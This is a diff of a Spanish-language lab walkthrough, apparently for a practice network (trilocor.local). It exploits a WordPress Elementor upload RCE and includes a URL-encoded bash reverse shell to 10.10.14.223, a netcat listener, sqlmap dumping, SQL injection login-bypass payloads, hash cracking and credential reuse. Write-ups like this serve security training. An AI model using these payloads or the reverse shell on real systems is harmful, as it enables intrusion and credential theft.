@@ -8,6 +8,8 @@ hidden: true
 
 * WordPress (80)
 
+<figure><img src="../.gitbook/assets/image (1739).png" alt=""><figcaption></figcaption></figure>
+
 Enumeramos los subdominios
 
 ```
@@ -123,6 +125,36 @@ Ya entramos a **/wp-admin.**
 
 {% embed url="https://github.com/AkuCyberSec/Elementor-3.18.0-Upload-Path-Traversal-RCE-CVE-2023-48777/tree/main" %}
 
+<figure><img src="../.gitbook/assets/image (1732).png" alt=""><figcaption></figcaption></figure>
+
+Ejecutamos el exploit.py.
+
+<figure><img src="../.gitbook/assets/image (1733).png" alt=""><figcaption></figcaption></figure>
+
+buscamos el enlace y hacemos la rev shell.
+
+<figure><img src="../.gitbook/assets/image (1734).png" alt=""><figcaption></figcaption></figure>
+
+codificamos la rev shell
+
+```
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.223%2F1234%200%3E%261%22
+```
+
+nos ponemos en escucha
+
+<figure><img src="../.gitbook/assets/image (1735).png" alt=""><figcaption></figcaption></figure>
+
+## post explotacion
+
+obtengo las credenciales en la base de datos
+
+<figure><img src="../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>
+
+entramos para ver los usuarios y sus contraseñas
+
+<figure><img src="../.gitbook/assets/image (1737).png" alt=""><figcaption></figcaption></figure>
+
 ```
 payloadFileName = './payload.php'  # Local path of YOUR payload
 baseUrl = 'http://admin.trilocor.local/'  # Base URL of the WordPress installation
@@ -143,6 +175,8 @@ nc -lnvp 1234
 ```
 
 Vamos al directorio **/var/www/html**. En wp-config.php está la contraseña con la que entramos en la base de datos.
+
+<figure><img src="../.gitbook/assets/image (1742).png" alt=""><figcaption></figcaption></figure>
 
 ```
 mysql -u wp-db-admin -p
@@ -177,12 +211,14 @@ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
 
 `pr-martins:martins`
 
+<figure><img src="../.gitbook/assets/image (1738).png" alt=""><figcaption></figcaption></figure>
+
 ### Human Resources (8088)
 
 Entrar en **tricolor.color:8088/index.php.** Hay un login por lo que hacemos los guiente con sqlmap.
 
 ```
-sqlmap -r req1 --batch --dump --level 2 --risk 2
+sqlmap -r request--batch --dump --level 2 --risk 2
 ```
 
 ```
@@ -202,14 +238,22 @@ ID | user_pass                         | user_email                  | user_logi
 
 Con Burpsuite realizamos estas inyecciones.
 
+<figure><img src="../.gitbook/assets/image (1740).png" alt=""><figcaption></figcaption></figure>
+
 ```
 GET /index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%271%27--+- HTTP/1.1
 http://trilocor.local:8088/index.php?username=%27or+%271%27%3D%271%27--+-&password=%27or+%271%27%3D%271%27--+-
 ```
 
+<figure><img src="../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>
+
 ### Public Relations PR (8009)
 
+<figure><img src="../.gitbook/assets/image (1743).png" alt=""><figcaption></figcaption></figure>
+
 Entramos en el **/admin** y reutilizamos las credenciales.
+
+
 
 `pr-martins:martins`
 
